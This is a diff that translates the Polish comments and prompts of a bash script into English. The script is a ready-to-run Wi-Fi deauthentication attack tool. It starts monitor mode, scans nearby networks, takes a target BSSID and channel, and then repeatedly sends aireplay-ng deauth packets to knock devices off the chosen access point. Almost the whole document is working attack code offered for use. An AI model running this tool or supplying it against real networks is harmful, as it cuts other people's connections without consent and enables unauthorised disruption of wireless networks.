@@ -31,92 +31,92 @@ echo "
  ░░░░░░░░    ░░░░░     ░░░░░   ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                                                                 
 "
 
-# Funkcja do sprawdzania czy klawisz "k" został naciśnięty
+# Function to check whether the "k" key has been pressed
 check_key_press() {
-    # Odczytujemy klawisz w trybie nieblokującym
+    # We read the key in non-blocking mode
     read -rsn1 -t 0.1 key
 
-    # Jeśli klawisz "k" został naciśnięty, zwracamy 0
+    # If the "k" key was pressed, we return 0
     [[ "$key" == "k" ]]
 }
 
-echo "Pamietaj, ze skrypt musi byc uruchomiony jako root!"
-echo "A twoja karta WiFi musi posiadac funkcje MONITOR MODE"
+echo "Remember that the script must be run as root!"
+echo "And your WiFi card must have the MONITOR MODE function"
 
 sleep 6
 clear
 
-# Wyświetlanie dostępnych interfejsów WiFi
+# Display available WiFi interfaces
 iwconfig
 
-# Zapytanie użytkownika o wybór interfejsu
-read -p "Wybierz interfejs WiFi (np. wlan1): " wlanx
+# Prompt the user to select an interface
+read -p "Select WiFi interface (e.g. wlan1):" wlanx
 
-# Uruchamianie trybu monitor mode dla wybranej karty
+# Starting monitor mode for the selected card
 airmon-ng check
 airmon-ng check kill
 airmon-ng start "$wlanx"
 
-echo "Za chwile nastapi skanowanie dostepnych sieci Wi-Fi."
-echo "Przerwij skanowanie za pomoca nacisniecia CTRL + C"
+echo "In a moment, a scan of available Wi-Fi networks will begin."
+echo "Stop scanning by pressing CTRL + C"
 
-# Zapytanie użytkownika o rodzaj sieci do skanowania
-read -p "Jaką sieć chcesz przeskanować? (1 - 2.4 GHz, 2 - 5 GHz): " network_type
+# Ask the user what type of network to scan
+read -p "What type of network do you want to scan? (1 - 2.4 GHz, 2 - 5 GHz):" network_type
 
-# Sprawdzenie odpowiedzi użytkownika i uruchomienie odpowiedniego skanowania
+# Check the user's response and run the appropriate scan
 if [[ "$network_type" == "1" ]]; then
     airodump-ng "$wlanx"
 elif [[ "$network_type" == "2" ]]; then
     sudo airodump-ng "$wlanx" --band a
 else
-    echo "Nieprawidłowy wybór. Wybierz 1 lub 2."
+    echo "Incorrect selection. Select 1 or 2."
     exit 1
 fi
 
-# Zapytanie użytkownika o BSSID sieci
-read -p "Podaj BSSID wybranej sieci: " bssid
+# Query the user for the network's BSSID
+read -p "Enter the BSSID of the selected network: " bssid
 
-# Zapytanie użytkownika o kanal sieci
-read -p "Podaj kanal CH wybranej sieci: " ch
+# Query the user for a network channel
+read -p "Enter the CH channel of the selected network: " ch
 
-# Nasluchiwanie wybranej sieci na wybranym kanale
-echo "Za chwile nastapi nasluchiwanie wybranego kanalu sieci Wi-Fi."
-echo "Zobaczysz ile urzadzen jest podlaczonych do AP."
-echo "Przerwij nasluchiwanie za pomoca nacisniecia CTRL + C"
+# Listen to the selected network on the selected channel
+echo "In a moment, the selected Wi-Fi channel will be listened to."
+echo "You will see how many devices are connected to the AP."
+echo "Stop listening by pressing CTRL + C"
 sleep 5
 airodump-ng -d "$bssid" -c "$ch" "$wlanx"
 
-# Zapytanie użytkownika o czas wykonywania polecenia aireplay-ng
-read -p "Podaj czas wykonywania ataku deautoryzacj (w sekundach): " sekundy
+# Query the user for the execution time of the aireplay-ng command
+read -p "Enter the time to perform the deauthorization attack (in seconds): " sekundy
 
-echo "Za chwile nastapi atak deautoryzacji wybranej sieci Wi-Fi."
-echo "Przerwij atak za pomoca nacisniecia klawisza 'K' "
+echo "A deauthorization attack of the selected Wi-Fi network will soon occur."
+echo "Interrupt the attack by pressing the 'K' key!"
 sleep 5
 
-# Czas rozpoczęcia ataku
+# Attack start time
 start_time=$(date +%s)
 
-# Wykonanie ataku deautentykacyjnego przez określoną liczbę sekund lub do momentu naciśnięcia klawisza "k"
+# Perform a deauthentication attack for a specified number of seconds or until the "k" key is pressed
 while true; do
-    # Aktualny czas
+    # Current time
     current_time=$(date +%s)
 
-    # Sprawdzenie, czy upłynął czas lub został naciśnięty klawisz "k"
+    # Check if time has passed or the "k" key has been pressed
     if [[ $((current_time - start_time)) -ge $sekundy ]]; then
         break
     fi
 
-    # Sprawdzenie, czy został naciśnięty klawisz "k"
+    # Check if the "k" key was pressed
     if check_key_press; then
         break
     fi
 
-    # Wykonanie ataku deautentykacyjnego
+    # Performing a deauthentication attack
     aireplay-ng --deauth 10 -a "$bssid" -D "$wlanx"
 done
 
-# Zatrzymywanie trybu monitor mode dla wybranej karty
+# Stopping monitor mode for the selected card
 airmon-ng stop "$wlanx"
 
-# Przywracanie normalnego dzialania sieci WiFi
+# Restoring normal operation of the WiFi network
 systemctl restart NetworkManager.service
